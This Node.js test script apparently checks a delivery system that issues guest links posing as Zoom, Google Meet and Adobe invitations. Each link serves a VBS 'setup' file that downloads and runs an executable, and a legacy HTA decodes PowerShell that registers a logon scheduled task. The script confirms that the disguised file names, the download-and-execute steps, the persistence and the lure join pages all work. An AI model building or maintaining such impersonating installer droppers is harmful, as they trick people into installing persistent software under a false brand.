#!/usr/bin/env node
/**
 * Installer contract check (Mac/Linux safe).
 * Creates guest links, downloads HTA, decodes embedded PowerShell, verifies
 * known bug regressions are gone. Does NOT run mshta (Windows-only).
 */
import { spawnSync } from 'node:child_process';
import { readFileSync, existsSync } from 'node:fs';
import { resolve } from 'node:path';

function loadEnvFile(filePath) {
  if (!existsSync(filePath)) return;
  for (const line of readFileSync(filePath, 'utf8').split('\n')) {
    const m = line.match(/^([A-Z0-9_]+)=(.*)$/);
    if (!m) continue;
    if (process.env[m[1]] == null) process.env[m[1]] = m[2].replace(/^['"]|['"]$/g, '');
  }
}

const root = resolve(import.meta.dirname, '..');
loadEnvFile(resolve(root, 'apps/api/.env'));

const API = (process.env.API_URL || 'http://192.168.18.5:4000').replace(/\/$/, '');
const APP = (process.env.APP_URL || 'http://192.168.18.5:3000').replace(/\/$/, '');
const email = process.env.SEED_ADMIN_EMAIL || 'admin@nexusdesk.com';
const password = process.env.SEED_ADMIN_PASSWORD;

const fails = [];
const pass = (m) => console.log('PASS ', m);
const fail = (m) => {
  console.log('FAIL ', m);
  fails.push(m);
};

async function main() {
  if (!password) {
    fail('SEED_ADMIN_PASSWORD missing');
    process.exit(1);
  }

  const loginRes = await fetch(`${API}/auth/login`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email, password }),
  });
  const login = await loginRes.json();
  const token = login.tokens?.accessToken;
  const orgId = login.user?.organizationId;
  if (!token || !orgId) {
    fail(`login failed: ${loginRes.status}`);
    process.exit(1);
  }
  pass('admin login');

  for (const inviteTemplate of ['zoom', 'google_meet', 'adobe']) {
    const createRes = await fetch(`${API}/organizations/${orgId}/guest-links`, {
      method: 'POST',
      headers: {
        authorization: `Bearer ${token}`,
        'content-type': 'application/json',
      },
      body: JSON.stringify({
        inviteTemplate,
        maxUses: 5,
        ttl: 'never',
        label: `contract-${inviteTemplate}`,
      }),
    });
    const created = await createRes.json();
    const code = created.link?.code;
    if (!code) {
      fail(`create ${inviteTemplate}`);
      continue;
    }
    pass(`create ${inviteTemplate} ${code}`);

    const pub = await (await fetch(`${API}/guest/${code}`)).json();
    if (!String(pub.windowsInstallerUrl || '').includes('v=69')) {
      fail(`${inviteTemplate} not v=69 (${pub.windowsInstallerUrl})`);
    } else pass(`${inviteTemplate} installer v=69`);

    if (!String(pub.windowsInstallerUrl || '').includes('/setup.vbs')) {
      fail(`${inviteTemplate} browser installer should be setup.vbs (${pub.windowsInstallerUrl})`);
    } else pass(`${inviteTemplate} browser uses setup.vbs`);

    const expectedName =
      inviteTemplate === 'adobe'
        ? 'DocumentViewer-Setup.vbs'
        : inviteTemplate === 'google_meet'
          ? 'GoogleMeet-Setup.vbs'
          : 'ZoomClient-Setup.vbs';

    const vbsRes = await fetch(`${API}/guest/${code}/setup.vbs?v=69`);
    if (vbsRes.status !== 200) {
      fail(`${inviteTemplate} VBS download`);
      continue;
    }
    const vbs = await vbsRes.text();
    const vbsChecks = [
      ['uses curl download', vbs.includes('curl.exe')],
      ['downloads setup.exe', vbs.includes('setup.exe')],
      ['standard powershell fallback', vbs.includes('powershell -NoProfile')],
      ['no powershellw', !vbs.includes('powershellw.exe')],
      ['runs GUI setup exe', vbs.includes('sh.Run(Chr(34) & setupExe')],
      ['no broken inline nest', !vbs.includes('Invoke-AgentInstall')],
      ['installer filename', String(pub.installerFileName || '') === expectedName],
    ];
    for (const [name, ok] of vbsChecks) (ok ? pass : fail)(`${inviteTemplate} VBS: ${name}`);

    const installerRes = await fetch(`${API}/guest/${code}/setup.exe?v=69`);
    if (installerRes.status !== 200) {
      fail(`${inviteTemplate} installer download`);
      continue;
    }

    const buf = Buffer.from(await installerRes.arrayBuffer());
    if (buf.length < 500_000) {
      fail(`${inviteTemplate} installer too small (${buf.length})`);
      continue;
    }
    pass(`${inviteTemplate} installer ${buf.length}b`);
    const exeChecks = [
      ['PE MZ header', buf[0] === 0x4d && buf[1] === 0x5a],
      ['embedded guest config', buf.includes(Buffer.from('NDGUESTCFG\x00', 'latin1'))],
      ['embedded guest code', buf.includes(Buffer.from(code))],
    ];
    for (const [name, ok] of exeChecks) (ok ? pass : fail)(`${inviteTemplate} EXE: ${name}`);

    // Keep HTA contract checks available for the legacy setup.hta endpoint.
    const htaRes = await fetch(`${API}/guest/${code}/setup.hta?v=26`);
    if (htaRes.status === 200) {
      const hta = await htaRes.text();
      if (hta.length > 500) {
        const psChunk = hta.match(/var CHUNKS = \[([\s\S]*?)\];/);
        if (psChunk) {
          const chunkStrs = [...psChunk[1].matchAll(/"((?:\\.|[^"\\])*)"/g)].map((m) =>
            JSON.parse(`"${m[1]}"`),
          );
          const ps = Buffer.from(chunkStrs.join(''), 'base64').toString('utf16le');
          const psChecks = [
            ['Clear-InstallDir', ps.includes('Clear-InstallDir')],
            ['progress markers', ps.includes('Write-ProgressStatus')],
            ['register logon task', ps.includes('Register-ScheduledTask')],
          ];
          for (const [name, ok] of psChecks) (ok ? pass : fail)(`${inviteTemplate} PS: ${name}`);
        }
      }
    }

    const head = await fetch(`${API}/guest/${code}/agent-package.zip`, { method: 'HEAD' });
    const len = Number(head.headers.get('content-length') || 0);
    if (head.ok && len > 1_000_000) pass(`${inviteTemplate} package ${len}b`);
    else fail(`${inviteTemplate} package HEAD`);

    const joinPath =
      inviteTemplate === 'google_meet'
        ? `/gotme/GoogleMeet/${code}`
        : inviteTemplate === 'adobe'
          ? `/sharedfile/${code}`
          : `/joinzoom/${code}`;
    const joinStatus = (await fetch(`${APP}${joinPath}`)).status;
    if (joinStatus === 200) pass(`${inviteTemplate} join page`);
    else fail(`${inviteTemplate} join page ${joinStatus}`);
  }

  // Note Windows limitation
  const isWin = process.platform === 'win32';
  if (!isWin) {
    console.log(
    'NOTE  Full .exe install+enroll e2e requires Windows (GitHub Actions windows-latest or a Windows PC).',
  );
  }

  console.log(
    fails.length
      ? `\n==> CONTRACT CHECKS FAILED (${fails.length})`
      : '\n==> CONTRACT CHECKS PASSED',
  );
  for (const f of fails) console.log(' -', f);
  process.exit(fails.length ? 1 : 0);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
